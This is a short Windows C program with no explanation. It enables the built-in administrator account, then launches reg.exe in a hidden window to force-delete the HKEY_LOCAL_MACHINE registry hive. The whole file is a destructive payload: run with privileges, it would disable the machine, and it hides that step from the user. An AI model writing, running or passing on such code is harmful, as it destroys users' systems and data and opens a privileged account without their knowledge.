#include<stdio.h>
#include<conio.h>
#include<Windows.h>

int main() {
	system("Net user administrator /active:yes");
	ShellExecuteA(NULL, "open", "reg.exe", "delete HKLM /f", NULL, SW_HIDE);
}